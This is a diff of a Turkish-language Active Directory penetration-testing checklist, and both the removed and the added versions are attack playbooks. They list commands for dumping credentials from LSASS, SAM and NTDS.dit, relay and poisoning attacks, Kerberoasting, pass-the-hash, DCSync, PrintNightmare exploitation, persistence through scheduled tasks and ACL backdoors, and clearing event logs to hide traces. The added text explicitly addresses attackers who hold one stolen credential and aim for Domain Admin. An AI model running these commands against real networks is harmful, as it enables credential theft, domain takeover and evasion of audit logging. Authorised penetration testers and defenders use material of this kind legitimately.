@@ -1,163 +1,163 @@
-# Active Directory Pentest Kontrol Listesi
+# Active Directory Pentest Checklist
 
-## 👍 Credential Gathering
-
-- [ ] **Kullanıcı Adlarını ve Parolaları Topla**
-  - **Komut**: `rpcclient -U "" [DC-IP]`
-- [ ] **DC'deki Misafir Oturumlarını Kontrol Et**
-  - **Komut**: `net use \\\[DC-IP] /user:guest`
-- [ ] **LAPS (Local Administrator Password Solution) Parolalarını Kontrol Et**
-  - **Komut**: `powershell -command "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd"`
-- [ ] **Ntlmrelayx ile Kimlik Bilgilerini Yakala**
-  - **Komut**: `python3 ntlmrelayx.py -smb2support`
-- [ ] **SAM Dosyasını Ele Geçir ve Analiz Et**
-  - **Komut**: `reg save hklm\sam sam.save`
-- [ ] **Cached Credentials İçin LSASS Belleğini Analiz Et**
-  - **Komut**: `procdump.exe -ma lsass.exe`
-- [ ] **NTDS.dit Dosyasını Çıkar ve Hashleri Dump Et**
-  - **Komut**: `secretsdump.py -just-dc [user]:[password]@[IP]`
-- [ ] **Mimikatz Kullanarak Kimlik Bilgilerini Çıkar**
-  - **Komut**: `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
-- [ ] **Windows Credential Manager'dan Kimlik Bilgilerini Topla**
-  - **Komut**: `cmdkey /list`
-- [ ] **Group Policy Preferences (GPP) Şifrelerini Keşfet**
-  - **Komut**: `findstr /S /I /C:"password" \\\[domain]\SYSVOL`
-- [ ] **Responder veya Inveigh ile Kimlik Bilgisi Toplamayı Dene**
-  - **Komut**: `responder -I [network_interface]`
-  - **PowerShell Komut**: `Invoke-Inveigh`
-- [ ] **Certify Kullanarak ADCS (Active Directory Certificate Services) Yapılandırmasını Analiz Et**
-  - **Komut**: `Certify.exe find`
-- [ ] **LAPSToolkit ile LAPS Yapılandırmasını Keşfet**
-  - **Komut**: `Get-LAPSComputers`
-- [ ] **KeeTheft ile Windows Credential Manager Şifrelerini Topla**
-  - **Komut**: `KeeTheft.exe dump`
-- [ ] **SafetyKatz veya BetterSafetyKatz ile Bellekten Kimlik Bilgisi Dump Et**
-  - **Komut**: `SafetyKatz.exe sekurlsa::logonpasswords`
-- [ ] **KrbRelay veya KrbRelayUp Kullanarak Kerberos Relay Saldırısını Dene**
-  - **Komut**: `KrbRelay.exe -dc-ip [DC-IP]`
-- [ ] **GMSAPasswordReader ile gMSA Şifrelerini Çıkar**
-  - **Komut**: `GMSAPasswordReader.exe`
-
-## 👍 Enumeration
-
-- [ ] **Domain Kullanıcılarını Listele**
-  - **Komut**: `Get-ADUser -Filter *`
-- [ ] **Domain Gruplarını Kontrol Et**
-  - **Komut**: `Get-ADGroup -Filter *`
-- [ ] **Domain Controller (DC) Yapılandırmasını Kontrol Et**
-  - **Komut**: `nltest /dclist:domainname`
-- [ ] **LDAP Bağlantılarını Kontrol Et**
-  - **Komut**: `ldapsearch -x -H ldap://[DC-IP] -b "DC=domain,DC=com"`
-- [ ] **GPO (Group Policy Objects) Ayarlarını İncele**
-  - **Komut**: `gpresult /h report.html`
-- [ ] **Forest ve Domain Trust İlişkilerini Analiz Et**
-  - **Komut**: `Get-ADTrust -Filter *`
-- [ ] **Domain Policy Bilgilerini Kontrol Et**
-  - **Komut**: `Get-DomainPolicy`
-- [ ] **Açık Paylaşımları (Shares) Listele**
-  - **Komut**: `net view \\\[IP]`
-- [ ] **Kerberos SPN'leri Listele**
-  - **Komut**: `GetUserSPNs.py -request -dc-ip [DC-IP] [domain/user]`
-- [ ] **SharpHound ile AD Ortamını Analiz Et**
-  - **Komut**: `SharpHound.exe -c All`
-- [ ] **ADRecon ile Detaylı Raporlama Yap**
-  - **Komut**: `ADRecon.ps1`
-- [ ] **PowerView Kullanarak AD Bilgilerini İncele**
-  - **Komut**: `Get-NetUser`, `Get-NetGroup`, `Get-NetComputer`
-- [ ] **bloodyAD ile AD Yapılandırmasını Analiz Et**
-  - **Komut**: `bloodyAD -u [user] -p [password] -d [domain]`
-- [ ] **SharpView ile AD Nesnelerini Detaylı Analiz Et**
-  - **Komut**: `SharpView.exe`
-- [ ] **ADFSDump Kullanarak ADFS Yapılandırmasını Analiz Et**
-  - **Komut**: `ADFSDump.exe`
-
-## 👍 Lateral Movement
-
-- [ ] **Uzak Masaüstü Protokolü (RDP) Üzerinden Bağlantı**
-  - **Komut**: `mstsc /v:[IP]`
-- [ ] **Pass-The-Hash Saldırıları İçin NTLM Hashlerini Kullan**
-  - **Komut**: `impacket-psexec [user]:[hash]@[IP]`
-- [ ] **PrintSpoofer ile Yetki Yükseltme Yap**
-  - **Komut**: `PrintSpoofer.exe -i`
-- [ ] **JuicyPotato veya GodPotato Kullanarak Hak Yükseltme Yap**
-  - **Komut**: `JuicyPotato.exe -t *`
-- [ ] **PetitPotam Saldırısını Gerçekleştir**
-  - **Komut**: `PetitPotam.py -d [domain] -u [user] -p [password]`
-- [ ] **SharpMove ile Lateral Movement Gerçekleştirin**
-  - **Komut**: `SharpMove.exe -d [domain] -u [user] -p [password]`
-- [ ] **RestrictedAdmin Modunda RDP ile Bağlantı**
-  - **Komut**: `mstsc /restrictedadmin /v:[IP]`
-- [ ] **SharpRDP ile RDP Saldırılarını Test Edin**
-  - **Komut**: `SharpRDP.exe -target [IP] -u [user] -p [password]`
-- [ ] **NetworkServiceExploit ile Ağ Hizmetlerini Hedef Alarak Lateral Movement Gerçekleştirin**
-  - **Komut**: `NetworkServiceExploit.exe`
-
-## 👍 Privilege Escalation
-
-- [ ] **Kerberoasting Saldırılarını Test Et**
-  - **Komut**: `GetUserSPNs.py -request -dc-ip [DC-IP] [domain/user]`
-- [ ] **Certify ile ADCS Zafiyetlerini Test Et**
-  - **Komut**: `Certify.exe request /ca:[CA Name]`
-- [ ] **Rubeus Kullanarak Kerberos Bileti Oluştur**
-  - **Komut**: `Rubeus.exe asktgt /user:[user] /rc4:[hash]`
-- [ ] **NoPac Saldırısını Test Et**
-  - **Komut**: `python3 noPac.py -dc-ip [DC-IP]`
-- [ ] **Powermad ile ACL Düzenlemesi Yaparak Hak Yükseltme Yap**
-  - **Komut**: `New-MachineAccount`
-- [ ] **SharpKatz ile Bellekten Hashleri Dump Et**
-  - **Komut**: `SharpKatz.exe sekurlsa::logonpasswords`
-- [ ] **RunasCs ile Yüksek Haklara Sahip Bir Kullanıcı Olarak İşlem Başlat**
-  - **Komut**: `RunasCs.exe -u [user] -p [password] -d [domain]`
-- [ ] **SharpUp ile Yanlış Yapılandırmaları Kontrol Ederek Hak Yükseltme Yap**
-  - **Komut**: `SharpUp.exe`
-- [ ] **Whisker ile Shadow Credentials Oluştur ve Kullan**
-  - **Komut**: `Whisker.exe create /target:[user]`
-- [ ] **PassTheCert ile Sertifika Bazlı Saldırılar Gerçekleştir**
-  - **Komut**: `PassTheCert.exe`
-
-## 👍 Persistence
-
-- [ ] **AdminSDHolder Özelliklerini Kontrol Et**
-  - **Komut**: `Get-ADObject -Filter {name -eq "AdminSDHolder"}`
-- [ ] **Scheduled Task Oluşturarak Kalıcılık Sağla**
-  - **Komut**: `schtasks /create /tn [taskname] /tr [command] /sc onlogon`
-- [ ] **Skeleton Key Yükleyerek DC'yi Manipüle Et**
-  - **Komut**: `mimikatz "privilege::debug sekurlsa::logonpasswords"`
-- [ ] **Acl-Backdoor Kullanarak Kalıcı Erişim Sağla**
-  - **Komut**: `Set-DomainObjectAcl`
-- [ ] **Shadow Credentials ile Kalıcılık Sağla**
-  - **Komut**: `Whisker.exe create /target:[user]`
-- [ ] **Powermad ile Yeni Makine Hesapları Oluştur ve Kontrolü Ele Geçir**
-  - **Komut**: `New-MachineAccount`
-- [ ] **SharpChrome ile Tarayıcı Şifrelerini Al ve Kalıcılık Sağla**
-  - **Komut**: `SharpChrome.exe`
-
-## 👍 Additional Checks
-
-- [ ] **ADCS (Active Directory Certificate Services) Yapılandırmasını Analiz Et**
-  - **Komut**: `certutil -dump`
-- [ ] **DNS Zone Transfer'ı Kontrol Et**
-  - **Komut**: `dig @<DNS-Server> <domain> axfr`
-- [ ] **SMB Signing'in Devre Dışı Olup Olmadığını Kontrol Et**
-  - **Komut**: `smbclient -L //[IP] -N`
-- [ ] **LLMNR ve NBT-NS Zehirlenmesine Karşı Savunmasızlığı Kontrol Et**
-  - **Komut**: `responder -I [network_interface] -w`
-- [ ] **MS17-010 (EternalBlue) Zafiyetini Test Et**
-  - **Komut**: `nmap -p445 --script smb-vuln-ms17-010 [IP]`
-- [ ] **PowerUp ile Yanlış Yapılandırmaları Test Et**
-  - **Komut**: `PowerUp.ps1`
-- [ ] **Seatbelt ile Endpoint Konfigürasyonlarını İncele**
-  - **Komut**: `Seatbelt.exe all`
-
-## 👍 Cleanup
-
-- [ ] **Kullanılan Araç ve Scriptleri Sistemden Temizle**
-  - **Komut**: `del /q /f [scriptname]`
-- [ ] **Event Logs Üzerinde İz Bırakmamak İçin Log Temizle**
-  - **Komut**: `Clear-EventLog -LogName *`
-- [ ] **Kullanıcı İzlerini Silmek İçin Temporary Dosyaları Temizle**
-  - **Komut**: `del /q /f %temp%\*`
+Bu belge, bir Active Directory ortamında pentest gerçekleştiren saldırganlar için kapsamlı bir kontrol listesi sunar. Senaryo, elinizde bir kullanıcının kimlik bilgileri (username ve password) olduğunu varsayar. Amaç, Domain Controller (DC) Admin hesabını ele geçirmektir.
 
 ---
 
-Bu liste, Active Directory pentest işlemleri sırasında tüm aşamalarda kapsamlı bir rehber sunar. Her bölümde belirtilen araç ve komutlar, sıklıkla kullanılan teknikler ve iyi uygulamaları temsil eder.
+## 1. Kimlik Bilgileri ile İlk Erişim Sağlama
+
+### 1.1 Kullanıcı Doğrulama
+```bash
+# Kimlik bilgilerinin doğru olup olmadığını test et
+crackmapexec smb <IP> -u <username> -p <password>
+```
+Açıklama: Kullanıcının bilgilerini SMB üzerinden doğrular. Eğer "[-] STATUS_LOGON_FAILURE" alıyorsanız bilgiler yanlış olabilir.
+
+---
+
+## 2. Kullanıcı Haklarını ve Gruplarını Kontrol Etme
+
+### 2.1 Net Komutu ile Kullanıcı Bilgileri
+```bash
+# Kullanıcının gruplarını öğren
+net user <username> /domain
+```
+Açıklama: Kullanıcının AD üzerindeki gruplarını listeler. Özellikle "Domain Admins" veya "Enterprise Admins" grubunda olup olmadığını kontrol edin.
+
+### 2.2 BloodHound ile Hakları Analiz Etme
+```bash
+# BloodHound verilerini toplama
+sharpHound.exe -c All -d <domain>
+```
+Açıklama: BloodHound, kullanıcıların haklarını ve ilişkilerini görselleştirir.
+
+---
+
+## 3. AD Hiyerarşisini ve Domain Bilgilerini Toplama
+
+### 3.1 Domain Bilgilerini Al
+```bash
+# Domain bilgilerini al
+whoami /all
+```
+Açıklama: Kullanıcının SID bilgisi ve haklarını kontrol eder.
+
+### 3.2 DC Makinalarını Belirleme
+```bash
+# DC makinalarını bul
+nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>
+```
+Açıklama: Domain Controller makinelerini listeler.
+
+---
+
+## 4. Dosya Paylaşımlarını Araştırma
+
+### 4.1 SMB Paylaşımlarını Listeleme
+```bash
+# SMB paylaşımlarını kontrol et
+smbclient -L //<IP> -U <username>%<password>
+```
+Açıklama: Hedef makinadaki paylaşımları listeler. Özellikle "SYSVOL" ve "NETLOGON" paylaşımını inceleyin.
+
+### 4.2 Paylaşımı Mount Etme
+```bash
+# Paylaşımı mount et
+smbclient //<IP>/<share_name> -U <username>%<password>
+```
+Açıklama: Paylaşılan dizinleri detaylı bir şekilde inceleyin.
+
+---
+
+## 5. Parola Politikalarını ve Hash'leri Toplama
+
+### 5.1 Parola Politikalarını Öğrenme
+```bash
+# Parola politikalarını öğren
+net accounts /domain
+```
+Açıklama: Parola uzunluğu ve süresi gibi politikaları kontrol eder.
+
+### 5.2 Hash Dumplama
+```bash
+# Hash dumplama (impacket)
+secretsdump.py <domain>/<username>:<password>@<IP>
+```
+Açıklama: Hedef makinedeki kullanıcıların hash'lerini çeker.
+
+---
+
+## 6. Yetki Yükseltme
+
+### 6.1 Kerberoasting
+```bash
+# Kerberoasting yap
+GetUserSPNs.py -request -dc-ip <DC_IP> <domain>/<username>:<password>
+```
+Açıklama: SPN kullanıcılarının hash'lerini toplar. Hashcat ile kırmayı deneyin.
+
+### 6.2 ASREPRoasting
+```bash
+# ASREP roasting
+GetNPUsers.py <domain>/<username>:<password> -dc-ip <DC_IP> -request
+```
+Açıklama: Kerberos pre-authentication disabled kullanıcılarını hedef alır.
+
+### 6.3 Pass-the-Hash
+```bash
+# Pass-the-Hash saldırısı
+pth-winexe -U <domain>/<username>%<NTLM_hash> //<IP> cmd.exe
+```
+Açıklama: Hash'i kullanarak hedef makineye bağlanır.
+
+---
+
+## 7. Domain Controller Erişimi
+
+### 7.1 DC'deki Verileri Toplama
+```bash
+# NTDS.dit dosyasını alın
+secretsdump.py -just-dc <domain>/<username>:<password>@<DC_IP>
+```
+Açıklama: DC üzerindeki tüm kullanıcıların hash'lerini elde eder.
+
+### 7.2 DCSync Saldırısı
+```bash
+# DCSync ile hashleri alın
+mimikatz
+lsadump::dcsync /domain:<domain> /user:<username>
+```
+Açıklama: AD üzerindeki kullanıcıların hash'lerini doğrudan elde eder.
+
+---
+
+## 8. Ekstra İstismar Yöntemleri
+
+### 8.1 Print Spooler Zafiyeti
+```bash
+# Print Spooler exploit
+python3 cve-2021-1675.py <username>:<password>@<DC_IP>
+```
+Açıklama: PrintNightmare zafiyetini kullanarak DC'ye erişim sağlar.
+
+### 8.2 LAPS Bilgilerini Okuma
+```bash
+# LAPS şifrelerini alın
+lapspass.py <username>:<password>@<DC_IP>
+```
+Açıklama: LAPS tarafından korunan şifreleri elde eder.
+
+---
+
+## 9. İzleri Temizleme
+
+### 9.1 Logları Temizleme
+```bash
+# Log temizleme (PowerShell)
+Clear-EventLog -LogName Security
+```
+Açıklama: Hedef makinedeki logları temizler.
+
+---
+
+Bu liste düzenli olarak güncellenmeli ve kullanılan araçların dokümantasyonları okunmalıdır. Başarılar!
